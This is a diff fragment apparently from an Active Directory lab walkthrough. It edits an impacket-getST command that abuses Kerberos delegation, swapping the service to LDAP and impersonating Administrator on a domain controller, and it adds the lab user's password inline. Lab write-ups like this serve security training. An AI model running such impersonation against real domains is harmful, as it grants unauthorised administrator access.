@@ -111,7 +111,7 @@ Ok so we can use the `CIFS/winterfell.north.sevenkingdoms.local` to request a ST
   impacket-getST -spn CIFS/winterfell.north.sevenkingdoms.local \
       -altservice LDAP/winterfell.north.sevenkingdoms.local \
       -impersonate Administrator \
-      north.sevenkingdoms.local/jon.snow \
+      north.sevenkingdoms.local/jon.snow:iknownothin \
       -dc-ip 10.2.10.11
 ```
 
